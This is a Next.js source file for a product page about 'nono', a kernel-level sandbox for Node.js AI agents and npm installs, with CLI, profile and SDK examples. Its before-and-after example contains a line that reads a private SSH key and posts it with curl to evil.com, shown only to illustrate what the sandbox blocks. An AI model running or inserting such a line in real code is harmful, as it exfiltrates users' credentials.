import { InfraPageLayout } from "@/components/infrastructure/InfraPageLayout";
import { InfraCodeBlock } from "@/components/infrastructure/InfraCodeBlock";

import { GlassCard } from "@/components/ui/GlassCard";
import {
  Lock,
  Layers,
  ShieldCheck,
  FileCode,
  Network,
  Package,
} from "lucide-react";
import Link from "next/link";
import type { Metadata } from "next";

export const metadata: Metadata = {
  title:
    "Node.js Sandbox - Isolate Node.js AI Agents with Kernel-Level Enforcement",
  description:
    "Sandbox Node.js scripts, npm installs, and AI agents with kernel-enforced isolation. nono restricts child_process, fs, and net at the syscall level.",
  alternates: { canonical: "/node-sandbox" },
  openGraph: {
    title:
      "Node.js Sandbox - Isolate Node.js AI Agents with Kernel-Level Enforcement",
    description:
      "Sandbox Node.js scripts, npm installs, and AI agents with kernel-enforced isolation. nono restricts child_process, fs, and net at the syscall level.",
    type: "website",
    images: [{ url: "/logo.png", width: 1200, height: 630, alt: "nono" }],
  },
};

const relatedPages = [
  {
    href: "/os-sandbox",
    label: "OS Sandbox",
    description: "Kernel-level isolation architecture",
  },
  {
    href: "/typescript-sdk",
    label: "TypeScript SDK",
    description: "N-API bindings for nono-ts",
  },
  {
    href: "/python-sandbox",
    label: "Python Sandbox",
    description: "Isolate Python agents and pip installs",
  },
];

const cliCode = `# Sandbox a Node.js AI agent with read-write to the project
nono run --allow-cwd -- node agent.js

# Sandbox Claude Code with the built-in profile
nono run --profile claude-code --allow-cwd -- claude

# Restrict network to LLM API endpoints only
nono run --allow-cwd --network-profile minimal -- node agent.js

# Use a profile with the node_runtime security group
nono run --profile node-agent.json --allow-cwd -- npm run build

# Sandbox an npm install to the project only
nono run --profile node-agent.json --allow-cwd -- npm install`;

const profileCode = `{
  "meta": {
    "name": "node-agent",
    "version": "1.0.0",
    "description": "Node.js AI agent with controlled access"
  },
  "security": {
    "groups": ["node_runtime"]
  },
  "filesystem": {
    "allow": ["$HOME/.npm"],
    "read_file": ["$HOME/.gitconfig"]
  },
  "network": {
    "allow_hosts": ["api.openai.com", "api.anthropic.com"]
  },
  "workdir": { "access": "readwrite" },
  "undo": {
    "exclude_patterns": ["node_modules", ".next", "dist"]
  },
  "interactive": false
}`;

const sdkCode = `import { CapabilitySet, AccessMode, apply } from 'nono-ts';
import { execSync } from 'child_process';

// Build a capability set programmatically
const caps = new CapabilitySet();
caps.allowPath('./workspace', AccessMode.ReadWrite);
caps.allowFile('./config.json', AccessMode.Read);
caps.blockNetwork();

// Apply — irrevocable after this call
apply(caps);

// Everything after this runs inside the sandbox
// child_process, fs, net — all restricted
execSync('node worker.js');
// worker.js inherits the same restrictions`;

const childProcessCode = `// Without nono: child_process inherits full user permissions
const { execSync } = require("child_process");
const fs = require("fs");

const key = fs.readFileSync("/home/user/.ssh/id_rsa", "utf8");
execSync(\`curl -X POST https://evil.com/exfil -d '\${key}'\`);
// This works. Nothing stops it.

// With nono: kernel denies access at the syscall level
// $ nono run --allow-cwd -- node agent.js
try {
  fs.readFileSync("/home/user/.ssh/id_rsa", "utf8");
} catch (err) {
  // EACCES: permission denied — kernel blocked the syscall
}
// The file is inaccessible to the sandboxed process.`;

export default function NodeSandboxPage() {
  return (
    <InfraPageLayout
      title="Node.js Sandbox for AI Agents"
      tagline="Node.js Isolation"
      description="Sandbox Node.js scripts, AI coding agents, and npm operations at the kernel level. nono's node_runtime security group covers nvm, fnm, npm, and volta paths — everything else is denied by default."
      relatedPages={relatedPages}
    >
      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
        {/* The problem */}
        <GlassCard className="md:col-span-2 p-8">
          <h2 className="text-2xl font-bold tracking-tight mb-4">
            Why Node.js agents need kernel-level sandboxing
          </h2>
          <div className="text-muted leading-relaxed space-y-4">
            <p>
              Most AI coding agents run on Node.js. Claude Code, Cursor&apos;s
              backend, and many open source agent frameworks use it as their
              runtime &mdash; giving every agent session full access to{" "}
              <code className="px-1.5 py-0.5 rounded bg-code-bg border border-border font-mono text-xs">
                child_process
              </code>
              ,{" "}
              <code className="px-1.5 py-0.5 rounded bg-code-bg border border-border font-mono text-xs">
                fs
              </code>
              , and{" "}
              <code className="px-1.5 py-0.5 rounded bg-code-bg border border-border font-mono text-xs">
                net
              </code>
              . The ecosystem compounds the risk: a single{" "}
              <code className="px-1.5 py-0.5 rounded bg-code-bg border border-border font-mono text-xs">
                npm install
              </code>{" "}
              can execute arbitrary code through postinstall scripts, and
              the average project pulls in hundreds of transitive dependencies.
              Supply chain attacks via npm packages are well-documented and
              increasing in frequency.
            </p>
            <p>
              Node.js has an experimental{" "}
              <code className="px-1.5 py-0.5 rounded bg-code-bg border border-border font-mono text-xs">
                --experimental-permission
              </code>{" "}
              flag, but it only restricts Node.js APIs &mdash; native addons,
              N-API modules, and child processes that call system binaries can
              bypass it entirely. Application-level restrictions in a language
              with native addon support are inherently incomplete.
            </p>
          </div>
        </GlassCard>

        {/* How nono sandboxes Node.js */}
        <GlassCard className="md:col-span-2 p-8">
          <h2 className="text-2xl font-bold tracking-tight mb-4">
            How nono sandboxes Node.js
          </h2>
          <div className="text-muted leading-relaxed space-y-4">
            <p>
              nono applies the sandbox before the Node.js process starts. On
              Linux and Windows (WSL2), it uses{" "}
              <strong className="text-foreground">Landlock LSM</strong> to
              set kernel-enforced filesystem and network rules. On macOS, it
              uses{" "}
              <strong className="text-foreground">Seatbelt</strong>. By the
              time V8 initialises and your agent code begins executing, the
              kernel is already enforcing the allow-list.
            </p>
            <p>
              Every filesystem operation &mdash; whether it comes from the{" "}
              <code className="px-1.5 py-0.5 rounded bg-code-bg border border-border font-mono text-xs">
                fs
              </code>{" "}
              module, a native addon, or a spawned child process &mdash;
              passes through the kernel&apos;s enforcement layer. An N-API module
              calling{" "}
              <code className="px-1.5 py-0.5 rounded bg-code-bg border border-border font-mono text-xs">
                open()
              </code>{" "}
              directly gets the same restrictions as{" "}
              <code className="px-1.5 py-0.5 rounded bg-code-bg border border-border font-mono text-xs">
                fs.readFileSync()
              </code>
              . This extends to npm postinstall scripts: when you run{" "}
              <code className="px-1.5 py-0.5 rounded bg-code-bg border border-border font-mono text-xs">
                npm install
              </code>{" "}
              inside a nono sandbox, every postinstall script inherits the same
              restrictions. A malicious package cannot read your SSH keys or
              exfiltrate data &mdash; even if its postinstall script tries to.
            </p>
          </div>
        </GlassCard>

        {/* Code examples */}
        <InfraCodeBlock
          code={childProcessCode}
          language="javascript"
          filename="before and after"
        />
        <InfraCodeBlock
          code={cliCode}
          language="bash"
          filename="terminal"
        />

        {/* node_runtime security group */}
        <GlassCard className="md:col-span-2 p-8">
          <h2 className="text-2xl font-bold tracking-tight mb-4">
            The node_runtime security group
          </h2>
          <div className="text-muted leading-relaxed space-y-4">
            <p>
              Node.js version managers and package managers store files in
              various locations:{" "}
              <code className="px-1.5 py-0.5 rounded bg-code-bg border border-border font-mono text-xs">
                ~/.nvm
              </code>{" "}
              for nvm,{" "}
              <code className="px-1.5 py-0.5 rounded bg-code-bg border border-border font-mono text-xs">
                ~/.local/share/fnm
              </code>{" "}
              for fnm,{" "}
              <code className="px-1.5 py-0.5 rounded bg-code-bg border border-border font-mono text-xs">
                ~/.volta
              </code>{" "}
              for Volta, and{" "}
              <code className="px-1.5 py-0.5 rounded bg-code-bg border border-border font-mono text-xs">
                ~/.npm
              </code>{" "}
              for the npm cache. A default-deny sandbox that blocks all of
              these prevents Node.js from running at all.
            </p>
            <p>
              nono&apos;s{" "}
              <code className="px-1.5 py-0.5 rounded bg-code-bg border border-border font-mono text-xs">
                node_runtime
              </code>{" "}
              security group bundles the minimal paths needed for Node.js
              toolchains to function: nvm, fnm, npm, and Volta directories.
              Include it in your profile and Node.js, npm, npx, and your
              version manager all work. Your home directory, SSH keys, and
              other projects remain blocked.
            </p>
          </div>
        </GlassCard>

        {/* Profile + composability */}
        <InfraCodeBlock
          code={profileCode}
          language="json"
          filename="profiles/node-agent.json"
        />
        <GlassCard className="p-6" glowColor="purple" hoverable>
          <Layers size={20} className="text-accent mb-4" strokeWidth={1.5} />
          <h3 className="text-lg font-semibold mb-2 tracking-tight">
            Composable with other groups
          </h3>
          <p className="text-sm text-muted leading-relaxed mb-2">
            Security groups are composable. An agent that runs both Node.js
            and Python can include{" "}
            <code className="px-1 py-0.5 rounded bg-code-bg border border-border font-mono text-xs">
              node_runtime
            </code>{" "}
            and{" "}
            <code className="px-1 py-0.5 rounded bg-code-bg border border-border font-mono text-xs">
              python_runtime
            </code>
            . Keep the allow-list narrow and credentials stay
            outside the sandbox automatically.
          </p>
          <p className="text-sm text-muted leading-relaxed">
            Run{" "}
            <code className="px-1 py-0.5 rounded bg-code-bg border border-border font-mono text-xs">
              nono profile show node-agent
            </code>{" "}
            to see every path the profile allows.
          </p>
        </GlassCard>

        {/* TypeScript SDK */}
        <GlassCard className="md:col-span-2 p-8">
          <h2 className="text-2xl font-bold tracking-tight mb-4">
            Sandbox from within Node.js
          </h2>
          <div className="text-muted leading-relaxed space-y-4">
            <p>
              The CLI wraps any command, but agent frameworks that manage their
              own lifecycle can apply the sandbox programmatically. The{" "}
              <Link
                href="/typescript-sdk"
                className="text-accent hover:text-accent-hover transition-colors"
              >
                nono TypeScript SDK
              </Link>{" "}
              (<code className="px-1.5 py-0.5 rounded bg-code-bg border border-border font-mono text-xs">
                nono-ts
              </code>
              ) provides N-API bindings to the same Rust core. Build a{" "}
              <code className="px-1.5 py-0.5 rounded bg-code-bg border border-border font-mono text-xs">
                CapabilitySet
              </code>
              , call{" "}
              <code className="px-1.5 py-0.5 rounded bg-code-bg border border-border font-mono text-xs">
                .apply()
              </code>
              , and kernel-level restrictions are active. Works with Node.js
              18+, Bun, and Deno.
            </p>
          </div>
        </GlassCard>

        <InfraCodeBlock
          code={sdkCode}
          language="typescript"
          filename="sandbox-agent.ts"
          className="md:col-span-2"
        />

        {/* What gets protected */}
        <GlassCard className="md:col-span-2 p-8">
          <h2 className="text-xl font-bold tracking-tight mb-6">
            What the sandbox restricts
          </h2>
          <div className="grid sm:grid-cols-2 md:grid-cols-4 gap-6">
            {[
              {
                icon: FileCode,
                title: "Filesystem",
                desc: "fs, path, and any native addon that calls read/write — all filtered at the syscall level. Only allowed paths succeed.",
              },
              {
                icon: Package,
                title: "npm and postinstall",
                desc: "npm install runs inside the sandbox. Postinstall scripts cannot access credentials, system files, or paths outside the allow-list.",
              },
              {
                icon: Network,
                title: "Network access",
                desc: "net, http, https, fetch — all network calls pass through kernel enforcement. Block entirely or route through nono's filtering proxy.",
              },
              {
                icon: ShieldCheck,
                title: "child_process escape",
                desc: "exec(), spawn(), fork() — all child processes inherit the sandbox. No escalation through spawning bash, curl, or other system binaries.",
              },
            ].map((item) => (
              <div key={item.title}>
                <item.icon
                  size={16}
                  className="text-accent mb-2"
                  strokeWidth={1.5}
                />
                <h3 className="text-sm font-semibold mb-1">{item.title}</h3>
                <p className="text-xs text-muted leading-relaxed">
                  {item.desc}
                </p>
              </div>
            ))}
          </div>
        </GlassCard>

        {/* Security properties */}
        <GlassCard className="md:col-span-2 p-8">
          <h2 className="text-xl font-bold tracking-tight mb-6">
            Security properties
          </h2>
          <div className="grid sm:grid-cols-2 md:grid-cols-4 gap-6">
            {[
              {
                icon: Lock,
                title: "Below the runtime",
                desc: "Enforcement happens at the kernel, not in V8. Native addons, N-API modules, and WASM cannot bypass it.",
              },
              {
                icon: Lock,
                title: "Irrevocable",
                desc: "Once applied, the sandbox cannot be loosened — not by the agent, not by a child process, not by nono itself.",
              },
              {
                icon: Lock,
                title: "Inherited",
                desc: "Every child process spawned via exec, spawn, or fork inherits the same restrictions automatically.",
              },
              {
                icon: Lock,
                title: "Zero overhead",
                desc: "Kernel-level enforcement with no runtime performance cost. No proxy layer between Node.js and the filesystem.",
              },
            ].map((item) => (
              <div key={item.title}>
                <item.icon
                  size={16}
                  className="text-accent mb-2"
                  strokeWidth={1.5}
                />
                <h3 className="text-sm font-semibold mb-1">{item.title}</h3>
                <p className="text-xs text-muted leading-relaxed">
                  {item.desc}
                </p>
              </div>
            ))}
          </div>
        </GlassCard>
      </div>
    </InfraPageLayout>
  );
}
